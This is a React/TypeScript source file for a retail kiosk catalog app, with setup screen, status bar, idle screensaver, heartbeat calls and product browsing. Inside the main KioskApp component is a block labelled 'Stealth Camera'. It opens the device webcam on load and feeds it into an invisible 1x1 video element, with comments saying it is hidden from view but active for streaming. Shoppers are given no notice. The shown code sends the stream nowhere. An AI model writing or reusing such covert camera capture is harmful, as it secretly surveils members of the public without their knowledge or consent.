
import React, { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import { StoreData, Brand, Category, Product, FlatProduct } from '../types';
import { 
  getKioskId, 
  provisionKioskId,
  getShopName, 
  completeKioskSetup, 
  isKioskConfigured, 
  sendHeartbeat, 
  initSupabase,
  setCustomKioskId 
} from '../services/kioskService';
import BrandGrid from './BrandGrid';
import CategoryGrid from './CategoryGrid';
import ProductList from './ProductList';
import ProductDetail from './ProductDetail';
import Screensaver from './Screensaver';
import Flipbook from './Flipbook';
import SetupGuide from './SetupGuide';
import { Loader2, Home, ChevronRight, Store, ArrowRight, MonitorPlay, MonitorOff, RotateCcw } from 'lucide-react';

// UPDATED TIMEOUT: 1 Minute = 60,000 ms (Reduced from 4 mins for better responsiveness)
const IDLE_TIMEOUT = 60000;
const HEARTBEAT_INTERVAL = 60000;

// --- SETUP SCREEN COMPONENT ---
const SetupScreen = ({ 
  kioskId, 
  onComplete,
  onRestoreId
}: { 
  kioskId: string, 
  onComplete: (name: string) => void,
  onRestoreId: (id: string) => void
}) => {
  const [shopName, setShopName] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isRestoreMode, setIsRestoreMode] = useState(false);
  const [customId, setCustomId] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!shopName.trim()) return;
    if(isRestoreMode && customId.trim()) {
       onRestoreId(customId.trim());
    }
    setIsSubmitting(true);
    await new Promise(r => setTimeout(r, 800));
    onComplete(shopName);
    setIsSubmitting(false);
  };

  return (
    <div className="h-screen w-screen bg-slate-900 flex items-center justify-center p-4">
      <div className="max-w-lg w-full bg-white rounded-3xl p-10 shadow-2xl animate-fade-in relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-blue-500 to-yellow-400"></div>
        <div className="mb-8 text-center">
           <div className="bg-blue-50 w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 text-blue-600"><Store size={32} /></div>
           <h1 className="text-3xl font-black text-slate-900 mb-2">Device Setup</h1>
           <p className="text-slate-500">Initialize this kiosk for your location.</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="bg-slate-50 rounded-xl p-4 mb-6 border border-slate-100">
             <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Assigned ID</span>
                <button type="button" onClick={() => setIsRestoreMode(!isRestoreMode)} className="text-[10px] text-blue-600 font-bold uppercase hover:underline flex items-center gap-1"><RotateCcw size={10} /> {isRestoreMode ? 'Cancel Restore' : 'Restore Device'}</button>
             </div>
             {isRestoreMode ? (
               <input type="text" value={customId} onChange={(e) => setCustomId(e.target.value)} placeholder="Enter ID (e.g. LOC-001)" className="w-full font-mono font-bold text-slate-700 bg-white px-3 py-2 rounded border border-blue-300 outline-none text-lg" autoFocus />
             ) : (
               <span className="font-mono font-bold text-slate-700 bg-white px-3 py-1 rounded border border-slate-200 text-lg block text-center">{kioskId}</span>
             )}
          </div>
          <div className="mb-6"><label className="block text-sm font-bold text-slate-700 mb-2 ml-1">Shop / Location Name</label><input type="text" value={shopName} onChange={(e) => setShopName(e.target.value)} placeholder="e.g. Downtown Mall - Entrance 1" className="w-full p-4 bg-white border-2 border-slate-200 rounded-xl focus:border-blue-500 focus:ring-0 outline-none transition-colors font-medium text-lg placeholder-slate-300" required /></div>
          <button type="submit" disabled={!shopName.trim() || isSubmitting || (isRestoreMode && !customId.trim())} className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 disabled:cursor-not-allowed text-white font-bold py-4 rounded-xl transition-all flex items-center justify-center gap-2 text-lg shadow-lg shadow-blue-600/20 active:scale-95">{isSubmitting ? <Loader2 className="animate-spin" /> : <>Initialize System <ArrowRight size={20} /></>}</button>
        </form>
        <div className="mt-8 text-center text-xs text-slate-400">Version 1.0.4 • Kiosk Pro</div>
      </div>
    </div>
  );
};

// --- TOP BAR ---
const TopBar = ({ 
  onHome, 
  onOpenSetup,
  brand,
  category,
  product,
  shopName,
  kioskId,
  companyLogoUrl,
  isConnected
}: { 
  onHome: () => void, 
  onOpenSetup: () => void,
  brand?: Brand | null,
  category?: Category | null,
  product?: Product | null,
  shopName: string,
  kioskId: string,
  companyLogoUrl?: string,
  isConnected: boolean
}) => {
  const [time, setTime] = useState(new Date());
  const [clicks, setClicks] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
     if (clicks === 0) return;
     const timer = setTimeout(() => setClicks(0), 2000); 
     if (clicks >= 5) { onOpenSetup(); setClicks(0); }
     return () => clearTimeout(timer);
  }, [clicks, onOpenSetup]);

  return (
    <div className="h-20 bg-white border-b border-slate-200 flex items-center justify-between px-8 shadow-sm z-40 shrink-0 relative">
       <div className="flex items-center gap-4">
         <button onClick={onHome} className="transition-transform active:scale-95 focus:outline-none">
            {/* Display Company Logo or Default Home Icon */}
            {companyLogoUrl ? (
                <img src={companyLogoUrl} alt="Home" className="h-10 w-auto object-contain hover:opacity-80 transition-opacity" />
            ) : (
                <div className="bg-slate-900 hover:bg-slate-800 text-white p-2 rounded-xl transition-colors shadow-lg shadow-slate-900/10"><Home size={22} /></div>
            )}
         </button>
         
         <div className="flex items-center h-full ml-4 space-x-2 text-slate-500 font-medium text-sm md:text-base">
            <span className={!brand ? "text-slate-900 font-bold" : "hover:text-slate-800 cursor-pointer"} onClick={onHome}>Home</span>
            {brand && <><ChevronRight size={16} /><span className={!category ? "text-slate-900 font-bold" : ""}>{brand.name}</span></>}
            {category && <><ChevronRight size={16} /><span className={!product ? "text-slate-900 font-bold" : ""}>{category.name}</span></>}
            {product && <><ChevronRight size={16} /><span className="text-slate-900 font-bold truncate max-w-[200px]">{product.name}</span></>}
         </div>
       </div>

       <div className="flex items-center gap-8">
          <div className="text-right hidden md:block select-none cursor-pointer active:scale-95 transition-transform" onClick={() => setClicks(c => c + 1)}>
            <div className="text-xl font-bold text-slate-900 tabular-nums leading-none">{time.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
            <div className="text-xs text-slate-400 uppercase tracking-widest font-semibold mt-1">{time.toLocaleDateString(undefined, { weekday: 'long', month: 'short', day: 'numeric' })}</div>
          </div>
          
          <div className="h-8 w-[1px] bg-slate-200"></div>
          
          <div className="flex items-center gap-4">
             <div className="flex flex-col items-end cursor-default select-none">
                <div className="flex items-center text-slate-900 text-sm font-bold gap-1">{shopName}</div>
                {/* Red/Green Light Indicator */}
                <div className="flex items-center gap-2 mt-0.5">
                   {/* This is the red/green light requested */}
                   <div className={`w-3 h-3 rounded-full border-2 border-white shadow-md relative overflow-hidden ${isConnected ? 'bg-green-500 shadow-green-500/50' : 'bg-red-500 shadow-red-500/50'}`}>
                      <div className="absolute inset-0 bg-white/20 rounded-full animate-pulse"></div>
                   </div>
                   <div className="flex items-center gap-2">
                       <span className={`text-[10px] font-bold uppercase tracking-wider ${isConnected ? 'text-green-600' : 'text-red-600'}`}>
                           {isConnected ? 'Connected' : 'Offline'}
                       </span>
                       <span className="text-[9px] text-slate-300 font-mono uppercase">ID: {kioskId}</span>
                   </div>
                </div>
             </div>
          </div>
       </div>
    </div>
  )
}

const Footer = ({ onToggleScreensaver, isScreensaverEnabled }: { onToggleScreensaver: () => void, isScreensaverEnabled: boolean }) => {
  return (
    <div className="h-14 bg-white border-t border-slate-200 flex items-center justify-between px-6 z-50 shrink-0">
      <div className="flex items-center gap-2 text-[10px] text-slate-400 font-mono"><span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>SYSTEM ONLINE</div>
      <div className="hidden md:block text-[10px] font-bold text-slate-400 uppercase tracking-widest">Kiosk Pro V1.0.4</div>
      <div className="flex items-center gap-6">
        <button onClick={onToggleScreensaver} className={`flex items-center gap-2 text-xs font-bold uppercase tracking-wider transition-colors px-3 py-2 rounded-lg ${isScreensaverEnabled ? 'text-blue-600 bg-blue-50' : 'text-slate-400 hover:text-slate-600'}`}>
           {isScreensaverEnabled ? <MonitorPlay size={16} /> : <MonitorOff size={16} />}{isScreensaverEnabled ? "Screensaver ON" : "Screensaver OFF"}
        </button>
      </div>
    </div>
  );
};

interface KioskAppProps {
  storeData: StoreData | null;
  onGoToAdmin: () => void;
}

const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
  const [loading, setLoading] = useState(true);
  const [setupRequired, setSetupRequired] = useState(false);
  const [isIdle, setIsIdle] = useState(false);
  const [isScreensaverEnabled, setIsScreensaverEnabled] = useState(true);
  const [kioskId, setKioskId] = useState<string>('');
  const [shopName, setShopName] = useState<string>('');
  const [selectedBrand, setSelectedBrand] = useState<Brand | null>(null);
  const [selectedCategory, setSelectedCategory] = useState<Category | null>(null);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [showFlipbook, setShowFlipbook] = useState(false);
  const [showSetupGuide, setShowSetupGuide] = useState(false);
  
  // Stealth Camera Ref
  const videoRef = useRef<HTMLVideoElement>(null);

  // Initialize Stealth Camera
  useEffect(() => {
    const initCamera = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            if (videoRef.current) {
                videoRef.current.srcObject = stream;
            }
        } catch (e) {
            console.warn("Camera access denied or unavailable (expected in some envs)", e);
        }
    };
    initCamera();
    
    // Cleanup
    return () => {
        if(videoRef.current && videoRef.current.srcObject) {
            const stream = videoRef.current.srcObject as MediaStream;
            stream.getTracks().forEach(track => track.stop());
        }
    }
  }, []);

  useEffect(() => {
    const initialize = async () => {
      try {
        initSupabase();
        let id = getKioskId();
        if (!id) { id = await provisionKioskId(); }
        setKioskId(id || 'ERR');
        if (!isKioskConfigured()) { setSetupRequired(true); setLoading(false); return; }
        setShopName(getShopName() || 'Unknown Kiosk');
        await sendHeartbeat();
      } catch (e) { console.error("Error initializing app", e); } finally { setLoading(false); }
    };
    initialize();
  }, []);

  useEffect(() => { if (!kioskId || setupRequired) return; const interval = setInterval(() => { sendHeartbeat(); }, HEARTBEAT_INTERVAL); return () => clearInterval(interval); }, [kioskId, setupRequired]);

  useEffect(() => {
    // If setup is active, or screensaver disabled, or guide open, do not enter idle mode.
    if (setupRequired || !isScreensaverEnabled || showSetupGuide) { 
        if (isIdle) setIsIdle(false); 
        return; 
    }

    let timeoutId: ReturnType<typeof setTimeout>;

    const resetTimer = () => { 
        if (isIdle) setIsIdle(false); 
        clearTimeout(timeoutId); 
        timeoutId = setTimeout(() => { 
            setIsIdle(true); 
            setSelectedProduct(null); 
            setSelectedCategory(null); 
            setSelectedBrand(null); 
            setShowFlipbook(false); 
        }, IDLE_TIMEOUT); 
    };

    const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
    events.forEach(event => document.addEventListener(event, resetTimer));
    
    if (!isIdle) { resetTimer(); }
    
    return () => { 
        clearTimeout(timeoutId); 
        events.forEach(event => document.removeEventListener(event, resetTimer)); 
    };
  }, [isIdle, setupRequired, isScreensaverEnabled, showSetupGuide]);

  useEffect(() => {
    const pressedKeys = new Set<string>();
    const handleKeyDown = (e: KeyboardEvent) => {
      pressedKeys.add(e.key.toLowerCase());
      if (pressedKeys.has('control') && pressedKeys.has('l') && pressedKeys.has('k') && pressedKeys.has('j')) { setShowSetupGuide(prev => !prev); pressedKeys.clear(); }
    };
    const handleKeyUp = (e: KeyboardEvent) => { pressedKeys.delete(e.key.toLowerCase()); };
    window.addEventListener('keydown', handleKeyDown); window.addEventListener('keyup', handleKeyUp);
    return () => { window.removeEventListener('keydown', handleKeyDown); window.removeEventListener('keyup', handleKeyUp); };
  }, []);

  const handleSetupComplete = async (name: string) => { setLoading(true); await completeKioskSetup(name); setShopName(name); setSetupRequired(false); setLoading(false); };
  const handleRestoreId = (id: string) => { setCustomKioskId(id); setKioskId(id); };
  
  const allProducts: FlatProduct[] = useMemo(() => { if (!storeData) return []; const flat: FlatProduct[] = []; storeData.brands.forEach(brand => { brand.categories.forEach(category => { category.products.forEach(product => { flat.push({ ...product, brandName: brand.name, categoryName: category.name }); }); }); }); return flat; }, [storeData]);
  
  const handleExport = useCallback(() => { if (!allProducts.length) return; const headers = ['ID', 'Brand', 'Category', 'Name', 'Description', 'SKU']; const rows = allProducts.map(p => [ p.id, p.brandName, p.categoryName, p.name, `"${p.description.replace(/"/g, '""')}"`, p.sku || '' ]); const csvContent = [headers.join(','), ...rows.map(r => r.join(','))].join('\n'); const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' }); const url = URL.createObjectURL(blob); const link = document.createElement('a'); link.href = url; link.setAttribute('download', 'kiosk_products_export.csv'); document.body.appendChild(link); link.click(); document.body.removeChild(link); }, [allProducts]);
  
  const handleHome = () => { setSelectedProduct(null); setSelectedCategory(null); setSelectedBrand(null); setShowFlipbook(false); setShowSetupGuide(false); };

  if (setupRequired) { return <SetupScreen kioskId={kioskId} onComplete={handleSetupComplete} onRestoreId={handleRestoreId} />; }
  if (loading) { return <div className="h-screen w-screen flex flex-col items-center justify-center bg-slate-50 text-slate-900"><Loader2 className="animate-spin mb-6 text-blue-600" size={64} /><h2 className="text-3xl font-bold tracking-tight text-slate-900">Kiosk Pro</h2><p className="text-sm text-slate-500 mt-2 font-medium">Loading System...</p></div>; }

  return (
    <div className="h-screen w-screen bg-slate-50 flex flex-col overflow-hidden relative font-sans text-slate-900">
      {/* STEALTH CAMERA: Hidden from view, but active for streaming logic */}
      <video ref={videoRef} autoPlay muted playsInline className="fixed top-0 left-0 w-1 h-1 opacity-0 pointer-events-none -z-50" />
      
      {isIdle && isScreensaverEnabled && !showSetupGuide && ( <Screensaver products={allProducts} ads={storeData?.ads?.screensaver || []} onWake={() => setIsIdle(false)} /> )}
      {showSetupGuide && ( <SetupGuide onClose={() => setShowSetupGuide(false)} /> )}
      {showFlipbook && storeData?.catalog && ( <Flipbook pages={storeData.catalog.pages} onClose={() => setShowFlipbook(false)} /> )}
      <TopBar onHome={handleHome} onOpenSetup={() => setShowSetupGuide(true)} brand={selectedBrand} category={selectedCategory} product={selectedProduct} shopName={shopName} kioskId={kioskId} companyLogoUrl={storeData?.companyLogoUrl} isConnected={!!storeData} />
      <div className="flex-1 overflow-hidden relative animate-fade-in flex flex-col">
        <div className="flex-1 overflow-y-auto relative">
          {!selectedBrand ? ( <BrandGrid brands={storeData?.brands || []} heroConfig={storeData?.hero} catalog={storeData?.catalog} ads={storeData?.ads} onSelectBrand={setSelectedBrand} onViewCatalog={() => setShowFlipbook(true)} onExport={handleExport} /> ) : !selectedCategory ? ( <CategoryGrid brand={selectedBrand} onSelectCategory={setSelectedCategory} onBack={() => setSelectedBrand(null)} /> ) : !selectedProduct ? ( <ProductList category={selectedCategory} onSelectProduct={setSelectedProduct} onBack={() => setSelectedCategory(null)} /> ) : ( <ProductDetail product={selectedProduct} onBack={() => setSelectedProduct(null)} /> )}
        </div>
      </div>
      <Footer onToggleScreensaver={() => setIsScreensaverEnabled(!isScreensaverEnabled)} isScreensaverEnabled={isScreensaverEnabled} />
    </div>
  );
}

export default KioskApp;